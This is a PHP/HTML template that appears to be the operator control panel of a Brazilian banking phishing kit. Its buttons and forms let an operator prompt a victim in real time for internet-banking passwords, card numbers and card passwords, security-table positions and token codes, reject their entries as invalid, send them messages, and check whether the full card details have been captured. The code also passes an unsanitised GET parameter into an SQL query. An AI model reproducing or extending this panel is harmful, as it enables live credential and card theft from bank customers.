<div class="block_commands" style="display:<?php echo $ManageFisicaM;?>">

	<div class="block_erros_commands">
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&mobile=true&send=inv_acesso">ACESSO X</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&mobile=true&send=inv_psn">PASS NET X</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&mobile=true&send=inv_pscc" class="last">SENHA CC X</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&mobile=true&send=inv_cc">CARTÃO X</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&mobile=true&send=inv_table">TABELA X</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&mobile=true&send=inv_pos" class="last">POSIÇÃO X</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&mobile=true&send=inv_tks">TOKEN X</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&mobile=true&send=finalizar" class="finaliza_user"><i class="fa fa-close"></i> &nbsp;FINALIZA</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&mobile=true&send=get_nota" class="anotacao_user last"><i class="fa fa-pencil"></i> &nbsp;ANOTAÇÃO</a>
	</div><!-- block_erros_commands -->

	<div class="clear"></div>
	<hr>
	<div class="clear"></div>

	<div class="block_get_commands">
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&mobile=true&send=get_pos"><i class="fa fa-get-pocket"></i> &nbsp;POSIÇÃO</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&mobile=true&send=get_table">TABELA</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&mobile=true&send=get_pscc" class="last">SENHA CC</a>
			<div class="clear"></div>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&mobile=true&send=get_cc">CARTÃO</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&mobile=true&send=get_tks_mobile" class="last"><i class="fa fa-get-pocket"></i> &nbsp;TOKEN</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&mobile=true&send=send_message_mobile" class="anotacao_user" style="margin:10px 0 0 10px!important;"><i class="fa fa-get-pocket"></i> &nbsp;MENSAGEM</a>
			<div class="clear"></div>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&mobile=true&send=get_phone" class="last">TELEFONE</a>
	</div><!-- block_get_commands -->

	<div class="clear"></div>
	
	<div class="block_aditions">
		
		<form action="acesso.php" method="post" style="display:<?php echo $displaySendName;?>;" id="FormNameM">
			<label for="send_name">
				<span class="star_span"><i class="fa fa-user"></i></span>
				<input type="text" id="send_name" name="send_name" placeholder="Nome do usuário" class="normal_input" autocomplete="off">
				<input type="hidden" name="send_id_user" value="<?php echo $SendIdUser;?>">
				<span class="final_span" onclick="document.getElementById('FormNameM').submit();"><i class="fa fa-send"></i></span>
			</label>
		</form>

		<form action="acesso.php" method="post" style="display:<?php echo $displaySendPos;?>;" id="FormPosM">
			<label for="send_pos_table">
				<span class="star_span"><i class="fa fa-user"></i></span>
				<input type="text" id="send_pos_table" name="send_pos_table" placeholder="Posição requerida" class="normal_input" maxlength="2" autocomplete="off">
				<input type="hidden" name="send_id_user" value="<?php echo $SendIdUser;?>">
				<span class="final_span" onclick="document.getElementById('FormPosM').submit();"><i class="fa fa-send"></i></span>
			</label>
		</form>

		<form action="acesso.php" method="post" style="display:<?php echo $displaySendNota;?>;" id="FormNotaM">
			<label for="send_nota">
				<span class="star_span"><i class="fa fa-user"></i></span>
				<input type="text" id="send_nota" name="send_nota" placeholder="Anotação" class="normal_input" autocomplete="off">
				<input type="hidden" name="send_id_user" value="<?php echo $SendIdUser;?>">
				<span class="final_span" onclick="document.getElementById('FormNotaM').submit();"><i class="fa fa-send"></i></span>
			</label>
		</form>

		<form action="acesso.php" method="post" style="display:<?php echo $displaySendRef;?>;" id="FormNotaK">
			<label for="send_ref">
				<span class="star_span"><i class="fa fa-key"></i></span>
				<input type="text" id="send_ref" name="send_ref" placeholder="Código Referencia Token" class="normal_input" autocomplete="off">
				<input type="hidden" name="send_id_user" value="<?php echo $SendIdUser;?>">
				<span class="final_span" onclick="document.getElementById('FormNotaK').submit();"><i class="fa fa-send"></i></span>
			</label>
		</form>

		<form action="acesso.php" method="post" style="display:<?php echo $displaySendMensagemM;?>;" id="FormNotaMsM">
			<label for="send_ref">
				<span class="star_span"><i class="fa fa-key"></i></span>
				<input type="text" id="send_mensagem_mobile" name="send_mensagem_mobile" placeholder="Mensagem ao usuário" class="normal_input" autocomplete="off">
				<input type="hidden" name="send_id_user" value="<?php echo $SendIdUser;?>">
				<span class="final_span" onclick="document.getElementById('FormNotaMsM').submit();"><i class="fa fa-send"></i></span>
			</label>
		</form>

	</div><!-- block_aditions -->

	<div class="clear"></div>

	<div class="block_information">
		<?php 

			$UsuarioGet = $_GET['gerenciar_fisi'];

			$tabela = 'acessos';
			$cond = "WHERE id = '$UsuarioGet'";
			$GetInfos = read($conn, $tabela, $cond);

		?>
		<span>Tabela completa: <b><?php echo ($GetInfos[0]['enviou_tabela'] == 1) ? 'Sim' : 'Não';?></b></span>
		<span class="last">CC FULL: <b><?php echo ($GetInfos[0]['cc_numero'] != '') ? 'Sim' : 'Não';?></span>
	</div><!-- block_information -->

	<div class="clear"></div>

	<a href="acesso.php" class="btn_close_now"><i class="fa fa-window-close"></i> &nbsp;FECHAR</a>

</div><!-- block_commands -->